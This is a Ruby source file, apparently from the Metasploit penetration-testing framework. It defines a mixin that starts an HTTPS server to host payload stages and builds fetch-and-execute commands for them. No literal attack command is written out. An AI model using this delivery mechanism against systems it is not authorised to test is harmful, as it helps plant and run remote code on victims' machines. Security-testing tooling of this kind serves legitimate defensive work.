# Mixin for fetch payloads that retrieve and execute a stage over HTTPS.
module Msf::Payload::Adapter::Fetch::Https
  include Msf::Exploit::EXE
  include Msf::Payload::Adapter
  include Msf::Payload::Adapter::Fetch
  include Msf::Payload::Adapter::Fetch::Server::Https

  def initialize(*args)
    super
  end

  # Validates certificate configuration before generating an HTTPS fetch command.
  #
  # @param uri [String] The payload URI path.
  # @param dynamic_arch [Boolean] Whether architecture is resolved at fetch time.
  # @return [String] The fetch-and-execute command.
  def generate_fetch_commands(uri: srvuri, dynamic_arch: false)
    validate_fetch_certificate
    super
  end

  def cleanup_handler
    if @fetch_service
      cleanup_http_fetch_service(@fetch_service, @myresources)
      @fetch_service.deref
      @fetch_service = nil
      @myresources.clear
    end

    super
  end

  def setup_handler
    validate_fetch_certificate
    unless datastore['FetchHandlerDisable']
      @fetch_service = start_https_fetch_handler(srvname)
      @srv_resources.each do |srv_entry|
        escaped_uri = ('/' + srv_entry[:uri]).gsub('//', '/')
        add_resource(@fetch_service, escaped_uri, srv_entry)
      end
    end
    super
  end
end
